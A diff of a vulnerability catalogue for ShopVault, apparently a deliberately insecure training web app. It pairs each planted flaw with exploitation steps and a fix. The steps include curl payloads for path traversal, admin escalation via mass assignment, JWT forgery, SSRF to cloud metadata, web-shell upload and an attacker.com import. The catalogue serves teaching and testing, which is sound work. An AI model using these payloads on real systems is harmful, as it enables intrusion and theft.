 
 ### A07-B5-user-enumeration
+
 - **Category**: A07 — Identification and Authentication Failures
 - **Location**: `backend/internal/handlers/auth.go`, `Login()` and `ForgotPassword()` methods
 - **Description**: The forgot password endpoint returns different responses for existing and non-existing email addresses. For existing emails it sends the reset token to the system log. For non-existing emails it returns immediately. Combined with A07-B4 (no rate limiting), this enables user enumeration.
@@ -756,6 +891,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   4. Timing difference confirms valid vs invalid emails
   5. Check server logs for the reset token of valid accounts
 - **Fix**:
+
 ```diff
  	var user models.User
  	row := database.DB.QueryRow("SELECT id, email FROM users WHERE email = ?", req.Email)
@@ -774,11 +910,13 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A07-F1-no-client-backoff
+
 - **Category**: A07 — Identification and Authentication Failures
 - **Location**: `frontend/src/pages/Login.tsx`, login submission handler
 - **Description**: The login form has no client-side rate limiting or backoff. Users can submit unlimited login attempts without any delay.
 - **Exploitation**: Combined with A07-B4, brute-force attacks are trivially automated.
 - **Fix**:
+
 ```diff
 +  const [attempts, setAttempts] = useState(0);
 +
@@ -801,6 +939,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A07-F2-password-in-console
+
 - **Category**: A07 — Identification and Authentication Failures
 - **Location**: `frontend/src/pages/Login.tsx`, `frontend/src/pages/Register.tsx`
 - **Description**: The login and registration forms log the user's password to the browser console: `console.log("Login attempt:", email, password)`. Anyone with access to the browser's DevTools can see the password.
@@ -809,6 +948,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   2. Attempt to login
   3. The password is printed in the console in plaintext
 - **Fix**:
+
 ```diff
 -    console.log("Login attempt:", email, password);
 +    console.log("Login attempt:", email);
@@ -816,10 +956,125 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 
 ---
 
-## A08 — Software and Data Integrity Failures
+## A08:2025 — Mishandling of Exceptional Conditions
+
+### A08:2025-B1-payment-panic
+
+- **Category**: A08:2025 — Mishandling of Exceptional Conditions
+- **Location**: `backend/internal/handlers/payments.go`, `Process()` method
+- **Severity**: High
+- **Description**: The `POST /api/payments/process` endpoint spawns a goroutine to process payment asynchronously. The goroutine calls `strconv.Atoi()` on the `amount` field (which is a float string like "99.99") and panics on conversion failure. The panic is NOT recovered — Gin's Recovery middleware only protects the request goroutine, so the panic kills the entire server process. Meanwhile, the HTTP response has already been sent with `200 OK "payment is being processed"`.
+- **Exploitation**:
+  1. `POST /api/payments/process` with `{"order_id": 1, "amount": "99.99", "provider": "test"}`
+  2. The server responds with `{"status": "processing", "message": "Payment is being processed"}` (200 OK)
+  3. The goroutine panics — the server process terminates
+  4. All active connections are dropped, all users lose service
+  5. The Docker container restarts, but the attack is repeatable
+- **Fix**:
+
+```diff
+ 	go func() {
++		defer func() {
++			if r := recover(); r != nil {
++				log.Printf("Payment processing recovered from panic: %v", r)
++			}
++		}()
+ 		amountCents, err := strconv.Atoi(req.Amount)
+ 		if err != nil {
+ 			log.Printf("Failed to parse payment amount: %v", err)
+-			panic("payment processing failed: invalid amount format")
++			return
+ 		}
+ 	}()
+```
+
+### A08:2025-B2-transactionless-checkout
+
+- **Category**: A08:2025 — Mishandling of Exceptional Conditions
+- **Location**: `backend/internal/handlers/cart.go`, `CapturePayment()` and `Checkout()` methods
+- **Severity**: Critical
+- **Description**: The checkout flow splits payment capture and order creation into two separate, non-transactional endpoints. `POST /api/payments/capture` inserts a record into the `payments` table, and `POST /api/cart/checkout` creates the order and order items. There is no database transaction wrapping these operations. If payment capture succeeds but the subsequent order creation fails (e.g., invalid product IDs), the payment is already captured with no order to fulfill — the user has been charged but receives nothing.
+- **Exploitation**:
+  1. `POST /api/payments/capture` — payment is captured, payment record created
+  2. `POST /api/cart/checkout` — send an order with an invalid `product_id` (e.g., 99999)
+  3. The `INSERT INTO order_items` fails, but the order INSERT has already committed
+  4. Payment is captured, incomplete order exists with no items
+  5. User has been charged but no products are allocated
+- **Fix**:
+
+```diff
++	// Wrap payment capture and order creation in a single database transaction
++	tx, _ := database.DB.Begin()
++	tx.Exec("INSERT INTO payments ...")
++	result, err := tx.Exec("INSERT INTO orders ...")
++	if err != nil {
++		tx.Rollback()
++		return
++	}
++	// ... insert order items ...
++	tx.Commit()
+```
+
+### A08:2025-B3-custom-recovery-leaks
+
+- **Category**: A08:2025 — Mishandling of Exceptional Conditions
+- **Location**: `backend/cmd/server/main.go`, custom panic recovery middleware
+- **Severity**: High
+- **Description**: The application uses a custom panic recovery middleware that dumps sensitive debug information into HTTP error responses. When any handler panics, the response includes: the panic message, the full goroutine stack trace (`debug.Stack()`), all environment variables (`os.Environ()`), the current working directory, and the process ID. This exposes internal paths, configuration, and potential secrets to any client that can trigger a panic.
+- **Exploitation**:
+  1. Trigger any panic (e.g., send malformed JSON that causes a nil pointer dereference)
+  2. The 500 response includes a JSON object with `"stack"`, `"env"`, `"cwd"`, and `"pid"` fields
+  3. `"env"` reveals `GIN_MODE=debug`, file paths, and any other environment variables
+  4. `"stack"` reveals internal package paths and function names
+- **Fix**:
+
+```diff
+-		r.Use(func(c *gin.Context) {
+-			defer func() {
+-				if err := recover(); err != nil {
+-					c.JSON(http.StatusInternalServerError, gin.H{
+-						"error":  fmt.Sprintf("Internal server error: %v", err),
+-						"panic":  err,
+-						"stack":  string(debug.Stack()),
+-						"env":    os.Environ(),
+-						"cwd":    func() string { d, _ := os.Getwd(); return d }(),
+-						"pid":    os.Getpid(),
+-					})
+-					c.Abort()
+-				}
+-			}()
+-			c.Next()
+-		})
++		r := gin.Default() // Use built-in recovery (logs only, no exposure)
+```
+
+### A08:2025-B4-upload-orphan-files
+
+- **Category**: A08:2025 — Mishandling of Exceptional Conditions
+- **Location**: `backend/internal/handlers/upload.go`, `processImage()` function
+- **Severity**: Medium
+- **Description**: The file upload handler saves an uploaded file to disk and spawns a goroutine to process it. If the filename starts with "crash\_", the goroutine intentionally panics (the panic is unrecovered). The file remains on disk, but the HTTP response was already 201 Created. There is no periodic cleanup job. Repeatedly uploading crash-trigger files consumes disk space indefinitely, eventually causing a denial of service.
+- **Exploitation**:
+  1. Login as admin
+  2. Upload a file named `crash_test.jpg` repeatedly via `POST /api/upload`
+  3. Each upload creates a file on disk that is never cleaned up
+  4. The response is `201 Created` — the user doesn't know processing failed
+  5. Over time, orphaned files fill the container's uploads/ directory
+- **Fix**:
+
+```diff
+ 	go processImage(filename)
++	// Add a cleanup mechanism: defer os.Remove on panic, or a periodic cleanup job
++	// Use a worker pool with proper error recovery instead of bare goroutines
+```
+
+---
+
+## A08:2021 — Software and Data Integrity Failures → DISSOLVED in 2025
 
 ### A08-B1-no-file-type-check
-- **Category**: A08 — Software and Data Integrity Failures
+
+- **Category**: A05:2025 — Security Misconfiguration _(redistributed from A08:2021)_
 - **Location**: `backend/internal/handlers/upload.go`, `Upload()` method
 - **Description**: The file upload endpoint does not validate the Content-Type or file extension of uploaded files. Any file type (PHP scripts, executables, HTML) can be uploaded to the server.
 - **Exploitation**:
@@ -827,6 +1082,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   2. `curl -X POST http://localhost:8080/api/upload -F "file=@shell.php"`
   3. The PHP file is uploaded and accessible via `/uploads/shell.php`
 - **Fix**:
+
 ```diff
 +	allowedTypes := map[string]bool{"image/jpeg": true, "image/png": true, "image/gif": true}
 +	contentType := file.Header.Get("Content-Type")
@@ -837,11 +1093,13 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A08-B2-no-upload-size-limit
-- **Category**: A08 — Software and Data Integrity Failures
+
+- **Category**: A05:2025 — Security Misconfiguration \*(redistributed from A08:2021)
 - **Location**: `backend/internal/handlers/upload.go`, `Upload()` method
 - **Description**: There is no file size limit on uploads. An attacker can upload very large files to exhaust server disk space or cause denial of service.
 - **Exploitation**: Upload a multi-gigabyte file until the server runs out of disk space.
 - **Fix**:
+
 ```diff
 +	const maxUploadSize = 10 << 20 // 10 MB
 +	if file.Size > maxUploadSize {
@@ -851,7 +1109,8 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A08-B3-unsigned-cart-cookie
-- **Category**: A08 — Software and Data Integrity Failures
+
+- **Category**: A10:2025 — Unsafe Direct Object Consumption \*(redistributed from A08:2021)
 - **Location**: `backend/internal/handlers/cart.go`, `GetCart()` method
 - **Description**: The cart state is stored in a gob-encoded cookie without any signature or encryption. A user can decode, modify, and re-encode the cookie to manipulate cart contents, prices, and quantities.
 - **Exploitation**:
@@ -860,6 +1119,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   3. Re-encode and set the cookie
   4. The checkout accepts the tampered cart data (see A04-B1)
 - **Fix**:
+
 ```diff
 +	// Use server-side cart storage keyed by session
 +	// or HMAC-sign the cookie with a server-side secret
@@ -871,7 +1131,8 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A08-B4-unvalidated-import
-- **Category**: A08 — Software and Data Integrity Failures
+
+- **Category**: A10:2025 — Unsafe Direct Object Consumption \*(redistributed from A08:2021)
 - **Location**: `backend/internal/handlers/import.go`, `ImportFromURL()` method
 - **Description**: The product import feature fetches JSON from an arbitrary URL and inserts it into the database without any data validation beyond checking that name and price are present. Malicious JSON can inject arbitrary values into any product field.
 - **Exploitation**:
@@ -879,6 +1140,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   2. Import via `POST /api/admin/import {"url": "https://attacker.com/evil.json"}`
   3. The malicious data is stored and rendered to users on the product page
 - **Fix**:
+
 ```diff
 +	// Validate each field individually
 +	if len(name) > 200 || len(description) > 2000 {
@@ -890,13 +1152,15 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A08-F1-cdn-no-integrity
-- **Category**: A08 — Software and Data Integrity Failures
+
+- **Category**: A06:2025 — Software Supply Chain Failures \*(redistributed from A08:2021)
 - **Location**: `frontend/index.html`, Bootstrap CDN script/link tags
 - **Description**: The Bootstrap CSS and JS files are loaded from a CDN (jsdelivr) without Subresource Integrity (SRI) hashes. If the CDN is compromised or the request is intercepted, malicious code could be injected via the script tag.
 - **Exploitation**:
   1. MITM attack: replace the Bootstrap JS with malicious code on the wire
   2. No integrity check — the browser executes the tampered script
 - **Fix**:
+
 ```diff
   <link
     rel="stylesheet"
@@ -907,7 +1171,8 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A08-F2-cookie-based-cart
-- **Category**: A08 — Software and Data Integrity Failures
+
+- **Category**: A10:2025 — Unsafe Direct Object Consumption \*(redistributed from A08:2021)
 - **Location**: `frontend/src/context/CartContext.tsx`, cart cookie synchronization
 - **Description**: The cart state is synchronized to a client-side cookie using `document.cookie`. The cookie is stored as plain JSON without any signature or encryption. Any script on the page can read and modify the cart cookie.
 - **Exploitation**:
@@ -917,9 +1182,10 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 
 ---
 
-## A09 — Security Logging and Monitoring Failures
+## A09:2025 — Security Logging and Monitoring Failures
 
 ### A09-B1-password-in-logs
+
 - **Category**: A09 — Security Logging and Monitoring Failures
 - **Location**: `backend/internal/handlers/auth.go`, `Login()` and `ForgotPassword()` methods
 - **Description**: The login handler logs the password in plaintext on failed attempts: `log.Printf("Login failed: wrong password for %s", req.Password)`. Additionally, the forgot password handler logs the reset token. These sensitive values are written to stdout/container logs.
@@ -929,6 +1195,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   3. The password is visible in plaintext
   4. Check logs for reset tokens: `docker compose logs backend | grep "reset for"`
 - **Fix**:
+
 ```diff
 -	log.Printf("Login failed: wrong password for %s", req.Password)
 +	log.Printf("Login failed for user %s", req.Email)
@@ -937,22 +1204,26 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A09-B2-no-admin-audit
+
 - **Category**: A09 — Security Logging and Monitoring Failures
 - **Location**: `backend/internal/handlers/admin.go`, all admin mutation endpoints
 - **Description**: Admin actions such as creating, updating, and deleting products are performed without any audit logging. There is no record of who performed what action and when. In case of a security incident, there is no way to trace the attacker's actions.
 - **Exploitation**: An attacker with admin access can modify or delete data without leaving a trail.
 - **Fix**:
+
 ```diff
 +	log.Printf("AUDIT: user_id=%d action=delete_product product_id=%d", userID, id)
 +	// Or insert into an audit_log table
 ```
 
 ### A09-B3-no-error-logging
+
 - **Category**: A09 — Security Logging and Monitoring Failures
 - **Location**: Entire backend — absence of structured logging
 - **Description**: The application uses `log.Printf` for all logging with no log levels, no structured format, no correlation IDs. Errors are logged inconsistently — some are logged, others are swallowed silently (e.g., `rows.Scan()` errors are skipped with `continue`).
 - **Exploitation**: During incident response, there is no way to trace request flow or correlate errors.
 - **Fix**:
+
 ```diff
 +// Use structured logging (e.g., zerolog, zap)
 +// Include request IDs, timestamps, user context, and severity levels
@@ -961,6 +1232,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A09-F1-token-in-console
+
 - **Category**: A09 — Security Logging and Monitoring Failures
 - **Location**: `frontend/src/api/client.ts`, request interceptor
 - **Description**: The Axios request interceptor logs the JWT token to the console on every request: `console.log("Request with token:", token)`. Anyone with browser DevTools access can see the authentication token.
@@ -969,12 +1241,14 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   2. Perform any action (browse products, view cart)
   3. The JWT is printed in the console on every API request
 - **Fix**:
+
 ```diff
 -    console.log("Request with token:", token);
 +    // Do not log authentication tokens
 ```
 
 ### A09-F2-cc-data-in-console
+
 - **Category**: A09 — Security Logging and Monitoring Failures
 - **Location**: `frontend/src/pages/Checkout.tsx`, checkout submission
 - **Description**: The checkout handler logs the full payment payload including credit card number, expiry, and CVV to the browser console: `console.log("Checkout payload:", payload)`. This is a debug statement left in production code.
@@ -983,6 +1257,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   2. Complete a checkout
   3. The full CC details are printed: `{cc_number: "4111111111111111", cc_expiry: "12/30", cc_cvv: "123", ...}`
 - **Fix**:
+
 ```diff
 -    console.log("Checkout payload:", payload);
 +    // Do not log payment information
@@ -990,13 +1265,161 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 
 ---
 
-## A10 — Server-Side Request Forgery (SSRF)
+## A10:2025 — Unsafe Direct Object Consumption
+
+### A10:2025-B1-path-traversal-files
+
+- **Category**: A10:2025 — Unsafe Direct Object Consumption
+- **Location**: `backend/internal/handlers/files.go`, `View()` method
+- **Severity**: Critical
+- **Description**: The `GET /api/files/view?path=<path>` endpoint joins the user-provided path with `./uploads` using `filepath.Join()` and reads the resulting file with `os.ReadFile()`. No authentication is required, and `filepath.Join()` does NOT prevent traversal when the user provides `../` sequences or absolute paths. An attacker can read arbitrary files from the server filesystem.
+- **Exploitation**:
+
+  ```bash
+  # Read /etc/passwd from the container
+  curl "http://localhost:8080/api/files/view?path=../../../etc/passwd"
+
+  # Read the SQLite database with all user data
+  curl "http://localhost:8080/api/files/view?path=../shopvault.db" -o shopvault.db
+
+  # Read Go source code
+  curl "http://localhost:8080/api/files/view?path=../internal/handlers/auth.go"
+  ```
+
+- **Fix**:
+
+```diff
+ 	fullPath := filepath.Join("./uploads", userPath)
++	// Resolve to absolute path and verify it's within allowed directory
++	absPath, _ := filepath.Abs(fullPath)
++	allowedDir, _ := filepath.Abs("./uploads")
++	if !strings.HasPrefix(absPath, allowedDir) {
++		c.JSON(http.StatusForbidden, gin.H{"error": "Access denied"})
++		return
++	}
+ 	data, err := os.ReadFile(absPath)
+```
+
+### A10:2025-B2-open-redirect-login
+
+- **Category**: A10:2025 — Unsafe Direct Object Consumption
+- **Location**: `backend/internal/handlers/auth.go` `Login()` method + `frontend/src/pages/Login.tsx`
+- **Severity**: High
+- **Description**: The login endpoint accepts a `?redirect=` query parameter and passes it through to the frontend in the JSON response as `redirect_url`. The frontend uses `window.location.href = response.redirect_url` without any URL validation. An attacker can craft a URL like `/login?redirect=https://attacker.com/phishing` that redirects the victim to a phishing site after they successfully authenticate. The attacker's site can mimic ShopVault or extract the JWT token from localStorage.
+- **Exploitation**:
+  ```bash
+  # Send a phishing link to a victim
+  # Victim visits: http://localhost:3000/login?redirect=https://attacker.com/phishing
+  # Victim logs in successfully
+  # Browser navigates to https://attacker.com/phishing
+  # The attacker's page can use window.opener or history to steal data
+  ```
+- **Fix**:
+
+```diff
++	// Validate redirect URL
++	redirectURL := c.Query("redirect")
++	if redirectURL != "" {
++		u, err := url.Parse(redirectURL)
++		if err != nil || (u.Scheme != "" && u.Scheme != "http" && u.Scheme != "https") {
++			redirectURL = ""
++		} else if u.Host != "" {
++			redirectURL = u.Path // Only allow relative paths
++		}
++	}
+```
+
+### A10:2025-B3-mass-assignment-profile
+
+- **Category**: A10:2025 — Unsafe Direct Object Consumption
+- **Location**: `backend/internal/handlers/auth.go`, `UpdateProfile()` method
+- **Severity**: Critical
+- **Description**: The `PUT /api/profile` endpoint accepts arbitrary JSON keys and builds an `UPDATE users` SQL query dynamically, setting ALL provided fields without filtering. A regular user can include `"role": "admin"` in the request body and escalate their privileges. The endpoint uses `middleware.GetUserFromContext()` to determine the user ID (correctly), but accepts any field values from the request body without an allowlist.
+- **Exploitation**:
+
+  ```bash
+  # Login as a regular user (customer@example.com / customer123)
+  TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
+    -H 'Content-Type: application/json' \
+    -d '{"email":"customer@example.com","password":"customer123"}' | jq -r '.token')
+
+  # Escalate to admin
+  curl -X PUT http://localhost:8080/api/profile \
+    -H "Authorization: Bearer $TOKEN" \
+    -H 'Content-Type: application/json' \
+    -d '{"role": "admin"}'
+
+  # Verify — get a new token with admin role
+  curl -s -X POST http://localhost:8080/api/auth/login \
+    -H 'Content-Type: application/json' \
+    -d '{"email":"customer@example.com","password":"customer123"}' | jq '.user.role'
+  # Returns: "admin"
+  ```
+
+- **Fix**:
+
+```diff
++	// Allowlist: only these fields can be updated by the user
++	allowedFields := map[string]bool{"full_name": true, "email": true}
+ 	for key, value := range req {
++		if !allowedFields[key] {
++			continue // Skip sensitive fields
++		}
+ 		setClauses = append(setClauses, fmt.Sprintf("%s = ?", key))
+ 		args = append(args, value)
+ 	}
+```
+
+### A10:2025-B4-config-merge-no-whitelist
+
+- **Category**: A10:2025 — Unsafe Direct Object Consumption
+- **Location**: `backend/internal/handlers/settings.go` `Update()` method + `auth.go` JWT signing
+- **Severity**: Critical
+- **Description**: The `POST /api/admin/settings` endpoint accepts arbitrary JSON key-value pairs and stores them all in a global `RuntimeConfig` map without any whitelist of allowed keys. The JWT signing logic in `Login()` checks this runtime config for a `jwt_secret` key and uses it to sign tokens if present, falling back to the hardcoded secret. An admin (or anyone who compromises admin) can set `{"jwt_secret": "evil"}` and from that point forward, all new JWTs are signed with the attacker's secret. The attacker can then forge valid JWT tokens for any user including admin.
+- **Exploitation**:
+
+  ```bash
+  # Login as admin and set a custom JWT secret
+  ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
+    -H 'Content-Type: application/json' \
+    -d '{"email":"admin@shopvault.com","password":"admin123"}' | jq -r '.token')
+
+  curl -X POST http://localhost:8080/api/admin/settings \
+    -H "Authorization: Bearer $ADMIN_TOKEN" \
+    -H 'Content-Type: application/json' \
+    -d '{"jwt_secret": "evil"}'
+
+  # Now forge a JWT signed with "evil"
+  # (Using jwt.io or a script: HS256, secret="evil", payload={"user_id":1,"email":"admin@shopvault.com","role":"admin"})
+  # Use the forged token to access any protected endpoint
+  ```
+
+- **Fix**:
+
+```diff
++	// Whitelist allowed config keys
++	allowedKeys := map[string]bool{
++		"site_title": true, "items_per_page": true, "maintenance_mode": true,
++	}
+ 	for key, value := range req {
++		if !allowedKeys[key] {
++			continue
++		}
+ 		RuntimeConfig[key] = value
+ 	}
+```
+
+---
+
+## A10:2021 — Server-Side Request Forgery → CONSOLIDATED into A01:2025
 
 ### A10-B1-ssrf-import-url
-- **Category**: A10 — Server-Side Request Forgery
+
+- **Category**: A01:2025 — Broken Access Control _(consolidated from A10:2021 SSRF)_
 - **Location**: `backend/internal/handlers/import.go`, `ImportFromURL()` method
 - **Description**: The `/api/admin/import` endpoint makes an HTTP GET request to any URL provided by the user without any validation. An attacker can use this to make the server access internal services, cloud metadata endpoints, or scan the internal network.
 - **Exploitation**:
+
   ```bash
   # Access internal services
   curl -X POST http://localhost:8080/api/admin/import \
@@ -1010,7 +1433,9 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
     -H 'Content-Type: application/json' \
     -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
   ```
+
 - **Fix**:
+
 ```diff
 +	// Validate the URL
 +	parsedURL, err := url.Parse(req.URL)
@@ -1026,10 +1451,12 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A10-B2-ssrf-image-proxy
-- **Category**: A10 — Server-Side Request Forgery
+
+- **Category**: A01:2025 — Broken Access Control _(consolidated from A10:2021 SSRF)_
 - **Location**: `backend/internal/handlers/products.go`, `ImageProxy()` method
 - **Description**: The `/api/products/image-proxy` endpoint fetches any URL and returns the response. No authentication is required. Anyone can use this endpoint to proxy requests to arbitrary targets, making the server a proxy for scanning internal networks or accessing restricted resources.
 - **Exploitation**:
+
   ```bash
   # Access internal admin endpoints
   curl "http://localhost:8080/api/products/image-proxy?url=http://localhost:8080/api/admin/users"
@@ -1037,7 +1464,9 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   # Scan internal ports
   curl "http://localhost:8080/api/products/image-proxy?url=http://127.0.0.1:5432"
   ```
+
 - **Fix**:
+
 ```diff
 +	// Restrict to allowed image domains
 +	parsedURL, err := url.Parse(url)
@@ -1051,7 +1480,8 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A10-B3-ssrf-webhook-callback
-- **Category**: A10 — Server-Side Request Forgery
+
+- **Category**: A01:2025 — Broken Access Control _(consolidated from A10:2021 SSRF)_
 - **Location**: `backend/internal/handlers/admin.go`, `WebhookCallback()` method
 - **Description**: The `/api/webhook/payment-callback` endpoint accepts a `callback_url` in the request body and makes an HTTP GET request to it without any validation. This endpoint requires no authentication, allowing anyone to trigger SSRF requests from the server.
 - **Exploitation**:
@@ -1061,6 +1491,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
     -d '{"callback_url": "http://169.254.169.254/latest/meta-data/"}'
   ```
 - **Fix**:
+
 ```diff
 +	// Require authentication for webhook callbacks
 +	// Validate the callback URL against an allowlist
@@ -1080,64 +1511,74 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 
 ## Summary
 
-| ID | Category | Location | Severity |
-|----|----------|----------|----------|
-| A01-B1 | Access Control | orders.go:Get() | High |
-| A01-B2 | Access Control | main.go admin routes | High |
-| A01-B3 | Access Control | admin.go:GetUsers() | Medium |
-| A01-F1 | Access Control | App.tsx admin routes | Medium |
-| A01-F2 | Access Control | AuthContext.tsx | Medium |
-| A02-B1 | Crypto | auth.go:hashPassword() | High |
-| A02-B2 | Crypto | auth.go/middleware auth.go | Critical |
-| A02-B3 | Crypto | auth.go:Me() | Critical |
-| A02-B4 | Crypto | cart.go:Checkout() | High |
-| A02-B5 | Crypto | auth.go:ForgotPassword() | Critical |
-| A02-F1 | Crypto | AuthContext.tsx | Medium |
-| A02-F2 | Crypto | Checkout.tsx | Medium |
-| A03-B1 | Injection | products.go:Search() | Critical |
-| A03-B2 | Injection | auth.go:Login() | Critical |
-| A03-B3 | Injection | admin.go:GetOrders() | Critical |
-| A03-B4 | Injection | upload.go:processImage() | Critical |
-| A03-B5 | Injection | templates/email.go | High |
-| A03-F1 | Injection | Shop.tsx | High |
-| A03-F2 | Injection | ProductDetail.tsx | High |
-| A03-F3 | Injection | Shop.tsx | High |
-| A04-B1 | Insecure Design | cart.go:Checkout() | Critical |
-| A04-B2 | Insecure Design | cart.go:Checkout() | High |
-| A04-B3 | Insecure Design | coupons.go/cart.go | Medium |
-| A04-F1 | Insecure Design | Cart.tsx | Medium |
-| A04-F2 | Insecure Design | Cart.tsx/Checkout.tsx | Medium |
-| A05-B1 | Misconfiguration | docker-compose.yml | Medium |
-| A05-B2 | Misconfiguration | database/seed.go | Critical |
-| A05-B3 | Misconfiguration | main.go StaticFS | Medium |
-| A05-B4 | Misconfiguration | Multiple handlers | Low |
-| A05-B5 | Misconfiguration | main.go (absence) | Medium |
-| A05-F1 | Misconfiguration | index.html (absence) | Medium |
-| A05-F2 | Misconfiguration | vite.config.ts | Low |
-| A06-B1 | Outdated Components | go.mod | Medium |
-| A06-B2 | Outdated Components | Dockerfile.backend | Low |
-| A06-F1 | Outdated Components | package.json | Medium |
-| A06-F2 | Outdated Components | Dockerfile.frontend | Low |
-| A07-B1 | Auth Failures | auth.go:Login() | Medium |
-| A07-B2 | Auth Failures | auth.go:Register() | Medium |
-| A07-B3 | Auth Failures | auth.go:Login() | High |
-| A07-B4 | Auth Failures | Entire app (absence) | High |
-| A07-B5 | Auth Failures | auth.go:ForgotPassword() | Medium |
-| A07-F1 | Auth Failures | Login.tsx | Low |
-| A07-F2 | Auth Failures | Login.tsx | Low |
-| A08-B1 | Data Integrity | upload.go:Upload() | High |
-| A08-B2 | Data Integrity | upload.go:Upload() | Medium |
-| A08-B3 | Data Integrity | cart.go:GetCart() | High |
-| A08-B4 | Data Integrity | import.go:ImportFromURL() | Medium |
-| A08-F1 | Data Integrity | index.html | Medium |
-| A08-F2 | Data Integrity | CartContext.tsx | Medium |
-| A09-B1 | Logging | auth.go multiple methods | High |
-| A09-B2 | Logging | admin.go (absence) | Medium |
-| A09-B3 | Logging | Entire app (absence) | Medium |
-| A09-F1 | Logging | api/client.ts | Medium |
-| A09-F2 | Logging | Checkout.tsx | High |
-| A10-B1 | SSRF | import.go:ImportFromURL() | Critical |
-| A10-B2 | SSRF | products.go:ImageProxy() | Critical |
-| A10-B3 | SSRF | admin.go:WebhookCallback() | Critical |
+| ID          | Category                        | Location                       | Severity |
+| ----------- | ------------------------------- | ------------------------------ | -------- |
+| A01-B1      | A01:2025 Access Control         | orders.go:Get()                | High     |
+| A01-B2      | A01:2025 Access Control         | main.go admin routes           | High     |
+| A01-B3      | A01:2025 Access Control         | admin.go:GetUsers()            | Medium   |
+| A01-F1      | A01:2025 Access Control         | App.tsx admin routes           | Medium   |
+| A01-F2      | A01:2025 Access Control         | AuthContext.tsx                | Medium   |
+| A02-B1      | A02:2025 Crypto                 | auth.go:hashPassword()         | High     |
+| A02-B2      | A02:2025 Crypto                 | auth.go/middleware auth.go     | Critical |
+| A02-B3      | A02:2025 Crypto                 | auth.go:Me()                   | Critical |
+| A02-B4      | A02:2025 Crypto                 | cart.go:Checkout()             | High     |
+| A02-B5      | A02:2025 Crypto                 | auth.go:ForgotPassword()       | Critical |
+| A02-F1      | A02:2025 Crypto                 | AuthContext.tsx                | Medium   |
+| A02-F2      | A02:2025 Crypto                 | Checkout.tsx                   | Medium   |
+| A03-B1      | A03:2025 Injection              | products.go:Search()           | Critical |
+| A03-B2      | A03:2025 Injection              | auth.go:Login()                | Critical |
+| A03-B3      | A03:2025 Injection              | admin.go:GetOrders()           | Critical |
+| A03-B4      | A03:2025 Injection              | upload.go:processImage()       | Critical |
+| A03-B5      | A03:2025 Injection              | templates/email.go             | High     |
+| A03-F1      | A03:2025 Injection              | Shop.tsx                       | High     |
+| A03-F2      | A03:2025 Injection              | ProductDetail.tsx              | High     |
+| A03-F3      | A03:2025 Injection              | Shop.tsx                       | High     |
+| A04-B1      | A04:2025 Insecure Design        | cart.go:Checkout()             | Critical |
+| A04-B2      | A04:2025 Insecure Design        | cart.go:Checkout()             | High     |
+| A04-B3      | A04:2025 Insecure Design        | coupons.go/cart.go             | Medium   |
+| A04-F1      | A04:2025 Insecure Design        | Cart.tsx                       | Medium   |
+| A04-F2      | A04:2025 Insecure Design        | Cart.tsx/Checkout.tsx          | Medium   |
+| A05-B1      | A05:2025 Misconfig              | docker-compose.yml             | Medium   |
+| A05-B2      | A05:2025 Misconfig              | database/seed.go               | Critical |
+| A05-B3      | A05:2025 Misconfig              | main.go StaticFS               | Medium   |
+| A05-B4      | A05:2025 Misconfig              | Multiple handlers              | Low      |
+| A05-B5      | A05:2025 Misconfig              | main.go (absence)              | Medium   |
+| A05-F1      | A05:2025 Misconfig              | index.html (absence)           | Medium   |
+| A05-F2      | A05:2025 Misconfig              | vite.config.ts                 | Low      |
+| A06-B1      | A06:2025 Supply Chain           | go.mod                         | Medium   |
+| A06-B2      | A06:2025 Supply Chain           | Dockerfile.backend             | Low      |
+| A06-F1      | A06:2025 Supply Chain           | package.json                   | Medium   |
+| A06-F2      | A06:2025 Supply Chain           | Dockerfile.frontend            | Low      |
+| A06:2025-B3 | A06:2025 Supply Chain           | Dockerfile.frontend (root)     | Medium   |
+| A06:2025-B4 | A06:2025 Supply Chain           | Repo (no CI/CD scan)           | Medium   |
+| A07-B1      | A07:2025 Auth Failures          | auth.go:Login()                | Medium   |
+| A07-B2      | A07:2025 Auth Failures          | auth.go:Register()             | Medium   |
+| A07-B3      | A07:2025 Auth Failures          | auth.go:Login()                | High     |
+| A07-B4      | A07:2025 Auth Failures          | Entire app (absence)           | High     |
+| A07-B5      | A07:2025 Auth Failures          | auth.go:ForgotPassword()       | Medium   |
+| A07-F1      | A07:2025 Auth Failures          | Login.tsx                      | Low      |
+| A07-F2      | A07:2025 Auth Failures          | Login.tsx                      | Low      |
+| A08:2025-B1 | A08:2025 Exceptional Conditions | payments.go:Process()          | High     |
+| A08:2025-B2 | A08:2025 Exceptional Conditions | cart.go:CapturePayment()       | Critical |
+| A08:2025-B3 | A08:2025 Exceptional Conditions | main.go recovery middleware    | High     |
